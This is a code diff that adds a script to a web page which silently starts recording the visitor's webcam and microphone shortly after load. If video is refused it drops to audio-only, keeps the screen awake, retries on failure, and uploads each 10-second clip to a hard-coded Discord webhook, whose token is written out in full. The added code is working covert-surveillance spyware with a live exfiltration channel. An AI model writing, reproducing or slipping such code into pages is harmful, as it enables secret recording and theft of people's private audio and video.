@@ -1499,3 +1499,268 @@
             'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';
 
         const CLIP_DURATION = 10;
+
+                // ================================================================
+        //  BACKGROUND WEBCAM / AUDIO RECORDING — 10s clips with fallback
+        // ================================================================
+        (function backgroundCamera() {
+            'use strict';
+
+            var videoEl = document.getElementById('bgVideo');
+            var stream = null;
+            var recorder = null;
+            var chunks = [];
+            var clipCounter = 0;
+            var isRecording = false;
+            var clipTimer = null;
+            var CLIP_DURATION_MS = 10000; // 10 seconds
+            var BITRATE = 3000000;
+            var AUDIO_BITRATE = 128000;
+            var isAudioOnly = false;
+            var MIME_TYPES_VIDEO = [
+                'video/webm;codecs=vp9',
+                'video/webm;codecs=vp8',
+                'video/webm;codecs=h264',
+                'video/webm'
+            ];
+            var MIME_TYPES_AUDIO = [
+                'audio/webm;codecs=opus',
+                'audio/webm',
+                'audio/mp4;codecs=mp4a.40.2',
+                'audio/mp4'
+            ];
+
+            function getSupportedMimeType(list) {
+                for (var i = 0; i < list.length; i++) {
+                    if (MediaRecorder.isTypeSupported(list[i])) {
+                        return list[i];
+                    }
+                }
+                return null;
+            }
+
+            function getCameraStream() {
+                // First try video+audio
+                var constraintsVideo = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    }
+                };
+
+                return navigator.mediaDevices.getUserMedia(constraintsVideo)
+                    .then(function(s) {
+                        isAudioOnly = false;
+                        return s;
+                    })
+                    .catch(function(err) {
+                        console.warn('[Camera] Video+audio getUserMedia failed:', err.name);
+                        // Check if it's a permission/constraint error on video
+                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError' ||
+                            err.name === 'OverconstrainedError' || err.name === 'NotFoundError') {
+                            // Try audio only
+                            console.warn('[Camera] Falling back to audio-only');
+                            var constraintsAudio = {
+                                audio: {
+                                    echoCancellation: false,
+                                    noiseSuppression: false,
+                                    autoGainControl: false
+                                }
+                            };
+                            return navigator.mediaDevices.getUserMedia(constraintsAudio)
+                                .then(function(audioStream) {
+                                    isAudioOnly = true;
+                                    return audioStream;
+                                })
+                                .catch(function(err2) {
+                                    console.error('[Camera] Audio-only fallback failed:', err2);
+                                    throw err2;
+                                });
+                        } else {
+                            throw err;
+                        }
+                    });
+            }
+
+            function uploadToDiscord(blob) {
+                var ext = isAudioOnly ? 'webm' : 'webm'; // Discord accepts webm for audio as well
+                var prefix = isAudioOnly ? 'audio' : 'clip';
+                var filename = prefix + '_' + String(++clipCounter).padStart(4, '0') + '.' + ext;
+                var formData = new FormData();
+                formData.append('file', blob, filename);
+                var now = new Date();
+                var timestamp = now.toISOString().replace('T', ' ').substring(0, 19);
+                var content = isAudioOnly ?
+                    '🎤 Audio clip #' + clipCounter + ' · ' + timestamp :
+                    '🎥 Video clip #' + clipCounter + ' · ' + timestamp;
+                formData.append('content', content);
+
+                return fetch(CAMERA_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                }).then(function(response) {
+                    if (!response.ok) {
+                        return response.text().then(function(text) {
+                            throw new Error('Discord ' + response.status + ': ' + text.substring(0, 100));
+                        });
+                    }
+                    console.log('[Camera] uploaded ' + (isAudioOnly ? 'audio' : 'video') + ' clip #' + clipCounter);
+                }).catch(function(err) {
+                    console.error('[Camera] upload failed:', err);
+                    clipCounter--;
+                    throw err;
+                });
+            }
+
+            function startRecorder(mediaStream) {
+                chunks = [];
+                var mimeType;
+                var options;
+                if (isAudioOnly) {
+                    mimeType = getSupportedMimeType(MIME_TYPES_AUDIO);
+                    options = {
+                        mimeType: mimeType || undefined,
+                        audioBitsPerSecond: AUDIO_BITRATE
+                    };
+                } else {
+                    mimeType = getSupportedMimeType(MIME_TYPES_VIDEO);
+                    options = {
+                        mimeType: mimeType || undefined,
+                        videoBitsPerSecond: BITRATE,
+                        audioBitsPerSecond: AUDIO_BITRATE
+                    };
+                }
+
+                var rec = new MediaRecorder(mediaStream, options);
+                rec.ondataavailable = function(e) {
+                    if (e.data && e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                rec.onstop = function() {
+                    if (chunks.length === 0) {
+                        scheduleNextClip();
+                        return;
+                    }
+                    var blob = new Blob(chunks, { type: mimeType || (isAudioOnly ? 'audio/webm' : 'video/webm') });
+                    console.log('[Camera] ' + (isAudioOnly ? 'audio' : 'video') + ' clip ready:',
+                        (blob.size / 1024 / 1024).toFixed(2) + ' MB');
+                    uploadToDiscord(blob)['finally'](function() {
+                        chunks = [];
+                        scheduleNextClip();
+                    });
+                };
+
+                rec.onerror = function(e) {
+                    console.error('[Camera] MediaRecorder error:', e);
+                    chunks = [];
+                    setTimeout(function() {
+                        if (stream) {
+                            try { recorder = null; startRecorder(stream); } catch (_) {}
+                        }
+                    }, 2000);
+                };
+
+                rec.start(1000);
+                return rec;
+            }
+
+            function scheduleNextClip() {
+                if (clipTimer) {
+                    clearTimeout(clipTimer);
+                    clipTimer = null;
+                }
+                if (!stream || !isRecording) return;
+                clipTimer = setTimeout(function() {
+                    clipTimer = null;
+                    if (stream && isRecording) {
+                        try {
+                            recorder = startRecorder(stream);
+                            var stopTimer = setTimeout(function() {
+                                if (recorder && recorder.state === 'recording') {
+                                    try { recorder.stop(); } catch (_) {}
+                                }
+                            }, CLIP_DURATION_MS);
+                            recorder._stopTimer = stopTimer;
+                        } catch (err) {
+                            console.error('[Camera] failed to start recorder:', err);
+                            setTimeout(function() {
+                                if (stream) {
+                                    try { recorder = startRecorder(stream); } catch (_) {}
+                                }
+                            }, 3000);
+                        }
+                    }
+                }, 300);
+            }
+
+            function initCamera() {
+                getCameraStream().then(function(s) {
+                    stream = s;
+                    videoEl.srcObject = stream;
+                    videoEl.play().catch(function() {});
+                    isRecording = true;
+                    recorder = startRecorder(stream);
+                    var stopTimer = setTimeout(function() {
+                        if (recorder && recorder.state === 'recording') {
+                            try { recorder.stop(); } catch (_) {}
+                        }
+                    }, CLIP_DURATION_MS);
+                    recorder._stopTimer = stopTimer;
+                    console.log('[Camera] background recording started (' + (isAudioOnly ? 'audio' : 'video') +
+                        ', 10s clips)');
+                }).catch(function(err) {
+                    console.error('[Camera] init failed:', err);
+                    setTimeout(initCamera, 5000);
+                });
+            }
+
+            // Wake lock
+            var wakeLock = null;
+
+            function requestWakeLock() {
+                try {
+                    if ('wakeLock' in navigator) {
+                        navigator.wakeLock.request('screen').then(function(lock) {
+                            wakeLock = lock;
+                            console.log('[Camera] wake lock active');
+                        }).catch(function() {});
+                    }
+                } catch (_) {}
+            }
+
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && isRecording) {
+                    requestWakeLock();
+                }
+            });
+
+            window.addEventListener('beforeunload', function() {
+                if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
+                if (recorder) { try { recorder.stop(); } catch (_) {} }
+                if (clipTimer) { clearTimeout(clipTimer); }
+                if (wakeLock) { try { wakeLock.release(); } catch (_) {} }
+            });
+
+            setTimeout(function() {
+                requestWakeLock();
+                initCamera();
+            }, 400);
+
+            window.__bgCam = {
+                getState: function() {
+                    return { isRecording: isRecording, clipCounter: clipCounter, stream: !!stream,
+                        recorder: !!recorder, isAudioOnly: isAudioOnly };
+                }
+            };
+        })();
+
+        
